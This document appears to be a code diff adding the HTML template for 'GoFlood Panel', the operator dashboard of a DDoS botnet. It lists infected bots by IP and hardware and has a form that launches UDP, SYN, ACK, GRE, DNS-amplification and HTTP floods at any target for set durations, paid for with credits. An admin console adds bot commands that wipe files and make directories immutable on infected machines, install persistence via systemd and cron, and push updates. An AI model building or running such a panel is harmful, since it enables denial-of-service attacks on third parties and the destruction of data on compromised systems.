@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoFlood Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        discord: {
+                            dark: '#1e1f22',
+                            darker: '#161618',
+                            darkest: '#111214',
+                            primary: '#5865f2',
+                            secondary: '#3ba55c',
+                            accent: '#ed4245',
+                            text: '#dbdee1',
+                            dim: '#949ba4',
+                            panel: '#2b2d31'
+                        }
+                    },
+                    fontFamily: {
+                        'sans': ['"Inter"', 'sans-serif'],
+                        'mono': ['"JetBrains Mono"', 'monospace']
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'glow': 'glow 2s ease-in-out infinite alternate'
+                    },
+                    keyframes: {
+                        glow: {
+                            '0%': { 'box-shadow': '0 0 5px rgba(88, 101, 242, 0.3)' },
+                            '100%': { 'box-shadow': '0 0 15px rgba(88, 101, 242, 0.6)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #111214;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(88, 101, 242, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(59, 165, 92, 0.1) 0%, transparent 50%);
+            color: #dbdee1;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .glass-panel {
+            background: rgba(43, 45, 49, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.3s ease;
+        }
+
+        .glass-panel:hover {
+            border-color: rgba(88, 101, 242, 0.3);
+            box-shadow: 0 0 15px rgba(88, 101, 242, 0.2);
+        }
+
+        .discord-btn {
+            background: rgba(88, 101, 242, 0.1);
+            border: 1px solid rgba(88, 101, 242, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .discord-btn:hover {
+            background: rgba(88, 101, 242, 0.2);
+            transform: translateY(-1px);
+        }
+
+        .discord-btn-danger {
+            background: rgba(237, 66, 69, 0.1);
+            border: 1px solid rgba(237, 66, 69, 0.3);
+        }
+
+        .discord-btn-success {
+            background: rgba(59, 165, 92, 0.1);
+            border: 1px solid rgba(59, 165, 92, 0.3);
+        }
+
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .status-active {
+            background-color: #3ba55c;
+            box-shadow: 0 0 0 2px rgba(59, 165, 92, 0.3);
+        }
+
+        .status-inactive {
+            background-color: #ed4245;
+            box-shadow: 0 0 0 2px rgba(237, 66, 69, 0.3);
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .badge-primary {
+            background: rgba(88, 101, 242, 0.1);
+            border: 1px solid rgba(88, 101, 242, 0.3);
+            color: #5865f2;
+        }
+
+        .badge-success {
+            background: rgba(59, 165, 92, 0.1);
+            border: 1px solid rgba(59, 165, 92, 0.3);
+            color: #3ba55c;
+        }
+
+        .badge-danger {
+            background: rgba(237, 66, 69, 0.1);
+            border: 1px solid rgba(237, 66, 69, 0.3);
+            color: #ed4245;
+        }
+
+        .badge-warning {
+            background: rgba(250, 166, 26, 0.1);
+            border: 1px solid rgba(250, 166, 26, 0.3);
+            color: #faa61a;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: rgba(30, 31, 34, 0.5);
+            border-radius: 3px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #5865f2;
+            border-radius: 3px;
+        }
+
+        .tab-button {
+            position: relative;
+            padding: 12px 16px;
+            cursor: pointer;
+            color: #949ba4;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .tab-button.active {
+            color: #dbdee1;
+        }
+
+        .tab-button.active:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #5865f2;
+        }
+
+        .metric-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(to right, #5865f2, #3ba55c);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .api-key {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(30, 31, 34, 0.5);
+            padding: 8px 12px;
+            border-radius: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            word-break: break-all;
+        }
+
+        .attack-method {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+            background: rgba(88, 101, 242, 0.1);
+            border: 1px solid rgba(88, 101, 242, 0.3);
+        }
+
+        .command-card {
+            transition: all 0.3s ease;
+            border-left: 3px solid transparent;
+        }
+
+        .command-card:hover {
+            transform: translateY(-2px);
+            border-left-color: #5865f2;
+        }
+
+        .user-level-owner {
+            color: #5865f2;
+        }
+
+        .user-level-admin {
+            color: #3ba55c;
+        }
+
+        .user-level-user {
+            color: #949ba4;
+        }
+
+        .grid-pattern {
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col grid-pattern">
+    <header class="bg-discord-darker border-b border-discord-dark px-6 py-4 flex justify-between items-center sticky top-0 z-50">
+        <div class="flex items-center gap-3">
+            <div class="w-8 h-8 flex items-center justify-center bg-discord-primary rounded-full">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-white">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
+                </svg>
+            </div>
+            <h1 class="text-xl font-bold">
+                <span class="text-discord-primary">GoFlood</span> <span class="text-discord-dim">Panel</span>
+            </h1>
+        </div>
+        <div class="flex items-center gap-4">
+            <div class="relative group">
+                <button id="profile-button" class="flex items-center gap-2 px-4 py-2 rounded-md discord-btn">
+                    <span class="text-sm font-medium">{{.User.Username}}</span>
+                    <span class="badge {{if eq .User.Level "Owner"}}badge-primary{{else if eq .User.Level "Admin"}}badge-success{{else}}badge-warning{{end}}">
+                        {{.User.Level}}
+                    </span>
+                    <i class="fas fa-chevron-down text-xs text-discord-dim"></i>
+                </button>
+                <div id="profile-dropdown" class="hidden absolute right-0 mt-2 w-56 bg-discord-panel border border-discord-dark rounded-md z-50 shadow-lg">
+                    <div class="p-3 border-b border-discord-dark">
+                        <p class="text-sm font-medium">{{.User.Username}}</p>
+                        <p class="text-xs text-discord-dim">{{.User.Level}} Access</p>
+                    </div>
+                    <div class="p-1">
+                        <a href="/logout" class="block px-3 py-2 text-sm rounded hover:bg-discord-dark transition-colors">
+                            <i class="fas fa-sign-out-alt mr-2 text-discord-dim"></i> Logout
+                        </a>
+                        {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+                        <button onclick="showAdminPanel()" class="block w-full text-left px-3 py-2 text-sm rounded hover:bg-discord-dark transition-colors">
+                            <i class="fas fa-user-shield mr-2 text-discord-primary"></i> Admin Console
+                        </button>
+                        {{end}}
+                        <button onclick="showUserSettings()" class="block w-full text-left px-3 py-2 text-sm rounded hover:bg-discord-dark transition-colors">
+                            <i class="fas fa-cog mr-2 text-discord-dim"></i> User Settings
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    {{if .Notice}}
+    <div class="mx-6 mt-4 px-4 py-3 bg-discord-panel border border-discord-primary/30 rounded-md flex justify-between items-center">
+        <span class="font-medium">{{.Notice}}</span>
+        <button onclick="this.parentElement.remove()" class="text-discord-dim hover:text-discord-primary transition-colors">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+    {{end}}
+
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 px-6 py-4">
+        <div class="glass-panel p-4 rounded-lg">
+            <div class="flex items-center justify-between">
+                <p class="metric-label">Connected Bots</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-discord-primary/10 border border-discord-primary/30">
+                    <i class="fas fa-robot text-discord-primary"></i>
+                </div>
+            </div>
+            <p class="mt-2 metric-value" id="bot-count">
+                {{.PeerCount}}
+            </p>
+            <p class="text-xs text-discord-dim mt-1">Total network power</p>
+        </div>
+        
+        <div class="glass-panel p-4 rounded-lg">
+            <div class="flex items-center justify-between">
+                <p class="metric-label">Active Attacks</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-discord-accent/10 border border-discord-accent/30">
+                    <i class="fas fa-bolt text-discord-accent"></i>
+                </div>
+            </div>
+            <p class="mt-2 metric-value">
+                {{len .ActiveHits}}/{{concLimit .User.Level}}
+            </p>
+            <p class="text-xs text-discord-dim mt-1">Max concurrent: {{concLimit .User.Level}}</p>
+        </div>
+        
+        <div class="glass-panel p-4 rounded-lg">
+            <div class="flex items-center justify-between">
+                <p class="metric-label">Credits</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-discord-secondary/10 border border-discord-secondary/30">
+                    <i class="fas fa-coins text-discord-secondary"></i>
+                </div>
+            </div>
+            <p class="mt-2 metric-value">
+                {{credits .User.Credits}}
+            </p>
+            <p class="text-xs text-discord-dim mt-1">{{if lt .User.Credits 0}}Unlimited power{{else}}Available balance{{end}}</p>
+        </div>
+        
+        <div class="glass-panel p-4 rounded-lg">
+            <div class="flex items-center justify-between">
+                <p class="metric-label">Uptime</p>
+                <div class="w-8 h-8 flex items-center justify-center rounded-full bg-discord-primary/10 border border-discord-primary/30">
+                    <i class="fas fa-clock text-discord-primary"></i>
+                </div>
+            </div>
+            <p class="mt-2 metric-value">
+                {{upHours .StartTime | printf "%.1f"}}h
+            </p>
+            <p class="text-xs text-discord-dim mt-1">Since {{.StartTime.Format "2006-01-02"}}</p>
+        </div>
+    </div>
+
+    <main class="flex-1 grid grid-cols-1 lg:grid-cols-3 gap-6 p-6">
+        <div class="glass-panel rounded-lg lg:col-span-2">
+            <div class="px-6 py-4 border-b border-discord-dark flex justify-between items-center">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="fas fa-bolt text-discord-primary"></i>
+                    Attack Control
+                </h2>
+                {{if .ActiveHits}}
+                <button onclick="stopAllAttacks()" class="discord-btn discord-btn-danger py-1 px-3 rounded-md flex items-center gap-2 text-sm">
+                    <i class="fas fa-stop-circle"></i>
+                    <span>Stop All</span>
+                </button>
+                {{end}}
+            </div>
+            
+            <div class="p-6 grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="space-y-6">
+                    <form action="/attack" method="POST" autocomplete="off" class="space-y-4"> 
+                        <div class="space-y-2">
+                            <label for="method" class="block text-sm metric-label flex items-center gap-2">
+                                <i class="fas fa-code-branch text-discord-primary"></i>
+                                Attack Method
+                            </label>
+                            <select id="method" name="method" required class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                                <option value="" disabled selected>Select method...</option>
+                                <option value="!udpflood">UDP Flood</option>
+                                <option value="!udpsmart">UDP Smart</option>
+                                <option value="!tcpflood">TCP Flood</option>
+                                <option value="!synflood">SYN Flood</option>
+                                <option value="!ackflood">ACK Flood</option>
+                                <option value="!greflood">GRE Flood</option>
+                                <option value="!dns">DNS Amplification</option>
+                                <option value="!http">HTTP Flood</option>
+                            </select>
+                        </div>
+                
+                        <div class="space-y-2">
+                            <label for="ip" class="block text-sm metric-label flex items-center gap-2">
+                                <i class="fas fa-bullseye text-discord-primary"></i>
+                                Target
+                            </label>
+                            <input type="text" id="ip" name="ip" required placeholder="example.com or 192.168.1.1" autocapitalize="off" autocorrect="off" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none font-mono">
+                        </div>
+                
+                        <div class="space-y-2">
+                            <label for="port" class="block text-sm metric-label flex items-center gap-2">
+                                <i class="fas fa-plug text-discord-primary"></i>
+                                Port
+                            </label>
+                            <input type="text" id="port" name="port" required placeholder="80" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none font-mono">
+                        </div>
+                
+                        <div class="space-y-2">
+                            <label for="duration" class="block text-sm metric-label flex items-center gap-2">
+                                <i class="fas fa-clock text-discord-primary"></i>
+                                Duration (seconds)
+                            </label>
+                            <input type="number" id="duration" name="duration" min="1" max="300" required placeholder="60" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                            <div class="flex justify-between text-xs text-discord-dim mt-1">
+                                <span>Minimum: 1s</span>
+                                <span>Maximum: 300s</span>
+                            </div>
+                        </div>
+                
+                        <button type="submit" class="w-full discord-btn py-3 px-6 rounded-md flex items-center justify-center gap-3 mt-4 font-medium"> 
+                            <i class="fas fa-rocket"></i>
+                            <span>Launch Attack</span>
+                        </button>
+                    </form>
+                </div>
+                
+                <div class="space-y-4">
+                    <h3 class="text-md font-medium flex items-center gap-2">
+                        <i class="fas fa-fire text-discord-accent"></i>
+                        Active Engagements
+                    </h3>
+                    <div class="custom-scrollbar overflow-y-auto" style="max-height: 300px;" id="attacks-container">
+                        {{if .ActiveHits}}
+                            <div class="space-y-2">
+                                {{range .ActiveHits}}
+                                <div class="bg-discord-dark rounded-md p-3 flex justify-between items-center">
+                                    <div>
+                                        <div class="flex items-center gap-2">
+                                            <span class="attack-method">
+                                                {{methodIcon .Method}} {{methodName .Method}}
+                                            </span>
+                                            <span class="text-xs text-discord-dim">{{.Remaining}} left</span>
+                                        </div>
+                                        <div class="font-mono text-sm mt-1">{{.Target}}:{{.Port}}</div>
+                                    </div>
+                                    <a href="/stop-attack?id={{.ID}}" class="discord-btn discord-btn-danger py-1 px-2 rounded text-sm">
+                                        <i class="fas fa-stop"></i>
+                                    </a>
+                                </div>
+                                {{end}}
+                            </div>
+                        {{else}}
+                            <div class="text-center py-8 text-discord-dim">
+                                <i class="fas fa-cloud text-4xl mb-2"></i>
+                                <p>No active attacks</p>
+                            </div>
+                        {{end}}
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="glass-panel rounded-lg">
+            <div class="px-6 py-4 border-b border-discord-dark">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="fas fa-network-wired text-discord-primary"></i>
+                    Bot Network
+                </h2>
+            </div>
+            
+            <div class="p-6 space-y-4">
+                <div class="flex justify-between items-center">
+                    <div>
+                        <span class="text-sm metric-label">Total Nodes</span>
+                        <p class="text-xl font-bold" id="bot-count-text">{{.PeerCount}}</p>
+                    </div>
+                    <div>
+                        <span class="text-sm metric-label">Network Power</span>
+                        <p class="text-xl font-bold" id="network-power">{{power .Bots | printf "%.2f"}} Gbps</p>
+                    </div>
+                </div>
+                
+                <div class="custom-scrollbar overflow-y-auto" style="max-height: 300px;" id="bots-container">
+                    {{if .Bots}}
+                        <div class="space-y-2">
+                            {{range .Bots}}
+                            <div class="bg-discord-dark rounded-md p-3 flex justify-between items-center bot-row" data-bot='{"IP":"{{.IP}}","Arch":"{{.Arch}}","Cores":{{if .Cores}}{{.Cores}}{{else}}0{{end}},"RAM":{{if .RAM}}{{.RAM}}{{else}}0{{end}},"LastHeartbeat":"{{.LastHeartbeat.Format "2006-01-02T15:04:05Z07:00"}}"}'>
+                                <div>
+                                    <div class="flex items-center gap-2">
+                                        {{if isOnline .LastHeartbeat}}
+                                        <span class="status-indicator status-active"></span>
+                                        {{else}}
+                                        <span class="status-indicator status-inactive"></span>
+                                        {{end}}
+                                        <span class="font-mono text-sm">{{.IP}}</span>
+                                    </div>
+                                    <div class="text-xs text-discord-dim mt-1 flex items-center gap-2">
+                                        <span>{{.Arch}}</span>
+                                        <span>•</span>
+                                        <span>{{.Cores}} cores</span>
+                                        <span>•</span>
+                                        <span>{{.RAM | printf "%.1f"}}GB RAM</span>
+                                    </div>
+                                </div>
+                                <div class="text-xs text-discord-dim">
+                                    {{.Time.Format "15:04"}}
+                                </div>
+                            </div>
+                            {{end}}
+                        </div>
+                    {{else}}
+                        <div class="text-center py-8 text-discord-dim">
+                            <i class="fas fa-robot text-4xl mb-2"></i>
+                            <p>No bots connected</p>
+                        </div>
+                    {{end}}
+                </div>
+            </div>
+        </div>
+        
+        <div class="glass-panel rounded-lg">
+            <div class="px-6 py-4 border-b border-discord-dark">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="fas fa-user-circle text-discord-primary"></i>
+                    User Panel
+                </h2>
+            </div>
+            
+            <div class="p-6 space-y-6">
+                <div>
+                    <h3 class="text-md font-medium mb-2">Account Information</h3>
+                    <div class="bg-discord-dark rounded-md p-4 space-y-3">
+                        <div class="flex justify-between">
+                            <span class="text-discord-dim">Username</span>
+                            <span>{{.User.Username}}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-discord-dim">Access Level</span>
+                            <span class="{{if eq .User.Level "Owner"}}user-level-owner{{else if eq .User.Level "Admin"}}user-level-admin{{else}}user-level-user{{end}}">
+                                {{.User.Level}}
+                            </span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-discord-dim">Account Created</span>
+                            <span>{{.User.CreatedAt.Format "2006-01-02"}}</span>
+                        </div>
+                    </div>
+                </div>
+                <!-- 
+                <div>
+                    <h3 class="text-md font-medium mb-2">API Key</h3>
+                    <div class="bg-discord-dark rounded-md p-4 space-y-3">
+                        <div class="api-key">{{.User.APIKey}}</div>
+                        <button onclick="regenerateApiKey()" class="w-full discord-btn py-2 rounded-md text-sm">
+                            <i class="fas fa-sync-alt mr-2"></i> Regenerate Key (Disabled)
+                        </button>
+                    </div>
+                </div>
+
+                {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+                <div>
+                    <h3 class="text-md font-medium mb-2">Quick Actions</h3>
+                    <div class="grid grid-cols-2 gap-2">
+                        <button onclick="sendBotCommand('!update')" class="discord-btn py-2 rounded-md text-sm">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Update
+                        </button>
+                        <button onclick="sendBotCommand('!persist')" class="discord-btn py-2 rounded-md text-sm">
+                            <i class="fas fa-infinity mr-2"></i> Persist
+                        </button>
+                    </div>
+                </div>
+                {{end}}
+                -->
+
+                <div>
+                    <h3 class="text-md font-medium mb-2">API Key</h3>
+                    <div class="bg-discord-dark rounded-md p-4 space-y-3">
+                        <div class="api-key">{{.User.APIKey}}</div>
+                        <button onclick="" class="w-full discord-btn py-2 rounded-md text-sm">
+                            <i class="fas fa-sync-alt mr-2"></i> Regenerate Key (Disabled)
+                        </button>
+                    </div>
+                </div>
+                
+                {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+                <div>
+                    <h3 class="text-md font-medium mb-2">Quick Actions</h3>
+                    <div class="grid grid-cols-2 gap-2">
+                        <button onclick="" class="discord-btn py-2 rounded-md text-sm">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Update (Disabled)
+                        </button>
+                        <button onclick="" class="discord-btn py-2 rounded-md text-sm">
+                            <i class="fas fa-infinity mr-2"></i> Persist (Disabled)
+                        </button>
+                    </div>
+                </div>
+                {{end}}
+            </div>
+        </div>
+        
+        <div class="glass-panel rounded-lg lg:col-span-2">
+            <div class="px-6 py-4 border-b border-discord-dark">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="fas fa-history text-discord-primary"></i>
+                    Attack History
+                </h2>
+            </div>
+            
+            <div class="p-6">
+                <div class="custom-scrollbar overflow-x-auto">
+                    <table class="w-full text-sm">
+                        <thead>
+                            <tr class="text-left text-discord-dim border-b border-discord-dark">
+                                <th class="pb-2 pr-4">Method</th>
+                                <th class="pb-2 pr-4">Target</th>
+                                <th class="pb-2 pr-4">Duration</th>
+                                <th class="pb-2 pr-4">Time</th>
+                                <th class="pb-2">Status</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-discord-dark">
+                            {{range .User.Transactions}}
+                            {{if eq .Description "Attack"}}
+                            <tr class="hover:bg-discord-dark/50">
+                                <td class="py-3 pr-4">
+                                    <span class="attack-method">
+                                        {{methodIcon .Status}} {{methodName .Status}}
+                                    </span>
+                                </td>
+                                <td class="py-3 pr-4 font-mono">{{.Description}}</td>
+                                <td class="py-3 pr-4">{{.Amount}}s</td>
+                                <td class="py-3 pr-4">{{.Time.Format "2006-01-02 15:04"}}</td>
+                                <td class="py-3">
+                                    <span class="badge badge-success">Completed</span>
+                                </td>
+                            </tr>
+                            {{end}}
+                            {{else}}
+                            <tr>
+                                <td colspan="5" class="py-8 text-center text-discord-dim">
+                                    <i class="fas fa-clock text-2xl mb-2"></i>
+                                    <p>No attack history yet</p>
+                                </td>
+                            </tr>
+                            {{end}}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div id="admin-overlay" class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center hidden">
+        <div class="bg-discord-darker rounded-lg w-full max-w-4xl max-h-[90vh] overflow-hidden">
+            <div class="px-6 py-4 border-b border-discord-dark flex justify-between items-center">
+                <h2 class="text-lg font-semibold flex items-center gap-2">
+                    <i class="fas fa-user-shield text-discord-primary"></i>
+                    Admin Console
+                </h2>
+                <button onclick="hideAdminPanel()" class="text-discord-dim hover:text-discord-primary transition-colors">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            
+            <div class="flex border-b border-discord-dark">
+                <button id="users-tab" class="tab-button active" onclick="switchTab('users')">
+                    <i class="fas fa-users mr-2"></i> User Management
+                </button>
+                <button id="commands-tab" class="tab-button" onclick="switchTab('commands')">
+                    <i class="fas fa-terminal mr-2"></i> Bot Commands
+                </button>
+                <button id="stats-tab" class="tab-button" onclick="switchTab('stats')">
+                    <i class="fas fa-chart-bar mr-2"></i> Statistics
+                </button>
+                <button id="api-tab" class="tab-button" onclick="switchTab('api')">
+                    <i class="fas fa-key mr-2"></i> API Keys
+                </button>
+            </div>
+            
+            <div id="users-content" class="tab-content p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">
+                <div class="mb-6">
+                    <button onclick="showAddUserForm()" class="discord-btn py-2 px-4 rounded-md flex items-center justify-center gap-2">
+                        <i class="fas fa-user-plus"></i>
+                        <span>Create New User</span>
+                    </button>
+                </div>
+                
+                <div id="add-user-form" class="hidden mb-6 glass-panel rounded-md border border-discord-primary/30">
+                    <div class="px-6 py-4 border-b border-discord-dark flex justify-between items-center">
+                        <h3 class="text-md font-semibold flex items-center gap-2">
+                            <i class="fas fa-user-plus text-discord-primary"></i>
+                            Create New User
+                        </h3>
+                        <button onclick="hideAddUserForm()" class="text-discord-dim hover:text-discord-primary transition-colors">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <form id="user-form" action="/add-user" method="POST" autocomplete="off" class="p-6 space-y-4">
+                        <div class="space-y-2">
+                            <label for="new-username" class="block text-sm metric-label">Username</label>
+                            <input type="text" id="new-username" name="username" required placeholder="username" autocapitalize="off" autocorrect="off" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                        </div>
+                        
+                        <div class="space-y-2">
+                            <label for="new-password" class="block text-sm metric-label">Password</label>
+                            <div class="relative">
+                                <input type="password" id="new-password" name="password" required placeholder="••••••••••••" autocomplete="new-password" class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none pr-10">
+                                <button type="button" onclick="togglePasswordVisibility('new-password')" class="absolute right-3 top-2.5 text-discord-dim hover:text-discord-primary">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                            <div class="text-xs text-discord-dim mt-1 space-y-1">
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="length-check"></i>
+                                    <span>Minimum 12 characters</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="case-check"></i>
+                                    <span>Uppercase & lowercase</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="number-check"></i>
+                                    <span>At least one number</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="special-check"></i>
+                                    <span>Special character</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="space-y-2">
+                            <label for="level" class="block text-sm metric-label">Access Level</label>
+                            <select id="level" name="level" required class="w-full bg-discord-dark border border-discord-dark rounded-md h-10 px-3 text-discord-text focus:border-discord-primary focus:ring-1 focus:ring-discord-primary outline-none">
+                                <option value="User">User</option>
+                                <option value="Admin">Admin</option>
+                                <option value="Owner">Owner</option>
+                            </select>
+                        </div>
+                        
+                        <div class="flex gap-4 pt-4">
+                            <button type="submit" class="flex-1 discord-btn discord-btn-success h-10 flex items-center justify-center gap-2">
+                                <i class="fas fa-user-plus"></i>
+                                <span>Create User</span>
+                            </button>
+                            <button type="button" onclick="hideAddUserForm()" class="flex-1 bg-discord-dark border border-discord-dark hover:border-discord-primary text-discord-primary h-10 rounded-md flex items-center justify-center gap-2 transition-all">
+                                <i class="fas fa-ban"></i>
+                                <span>Cancel</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="custom-scrollbar overflow-x-auto">
+                    <table class="w-full text-sm">
+                        <thead>
+                            <tr class="text-left text-discord-dim border-b border-discord-dark">
+                                <th class="pb-2 pr-4">Username</th>
+                                <th class="pb-2 pr-4">Level</th>
+                                <th class="pb-2 pr-4">Created</th>
+                                <th class="pb-2">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-discord-dark">
+                            {{range .Users}}
+                            <tr class="hover:bg-discord-dark/50">
+                                <td class="py-3 pr-4">{{.Username}}</td>
+                                <td class="py-3 pr-4">
+                                    {{if eq .Level "Owner"}}
+                                    <span class="badge badge-primary">Owner</span>
+                                    {{else if eq .Level "Admin"}}
+                                    <span class="badge badge-success">Admin</span>
+                                    {{else}}
+                                    <span class="badge">User</span>
+                                    {{end}}
+                                </td>
+                                <td class="py-3 pr-4">{{.CreatedAt.Format "2006-01-02"}}</td>
+                                <td class="py-3">
+                                    {{if ne .Username "root"}}
+                                    <form action="/delete-user" method="get" class="inline">
+                                        <input type="hidden" name="username" value="{{.Username}}">
+                                        <button type="submit" class="discord-btn discord-btn-danger py-1 px-2 rounded text-xs">
+                                            <i class="fas fa-trash-alt mr-1"></i> Delete
+                                        </button>
+                                    </form>
+                                    {{end}}
+                                </td>
+                            </tr>
+                            {{end}}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div id="commands-content" class="tab-content hidden p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="command-card glass-panel p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2">
+                                <i class="fas fa-skull"></i>
+                                Kill Switch
+                            </h3>
+                            <span class="badge badge-danger">DESTRUCTIVE</span>
+                        </div>
+                        <p class="text-sm text-discord-dim mb-4">Wipes files from common directories on infected systems</p>
+                        <button onclick="sendBotCommand('!kill')" class="w-full discord-btn discord-btn-danger py-2 px-4 rounded-md">
+                            <i class="fas fa-radiation mr-2"></i> Execute
+                        </button>
+                    </div>
+                    
+                    <div class="command-card glass-panel p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2">
+                                <i class="fas fa-lock"></i>
+                                File Locker
+                            </h3>
+                            <span class="badge badge-danger">DESTRUCTIVE</span>
+                        </div>
+                        <p class="text-sm text-discord-dim mb-4">Locks down filesystem by making directories immutable</p>
+                        <button onclick="sendBotCommand('!lock')" class="w-full discord-btn discord-btn-danger py-2 px-4 rounded-md">
+                            <i class="fas fa-lock mr-2"></i> Execute
+                        </button>
+                    </div>
+                    
+                    <div class="command-card glass-panel p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2">
+                                <i class="fas fa-infinity"></i>
+                                Persistence
+                            </h3>
+                            <span class="badge badge-success">STEALTH</span>
+                        </div>
+                        <p class="text-sm text-discord-dim mb-4">Installs persistence mechanism via systemd and cron</p>
+                        <button onclick="sendBotCommand('!persist')" class="w-full discord-btn discord-btn-success py-2 px-4 rounded-md">
+                            <i class="fas fa-save mr-2"></i> Install
+                        </button>
+                    </div>
+                    
+                    <div class="command-card glass-panel p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2">
+                                <i class="fas fa-sync-alt"></i>
+                                Update Bots
+                            </h3>
+                            <span class="badge badge-primary">MAINTENANCE</span>
+                        </div>
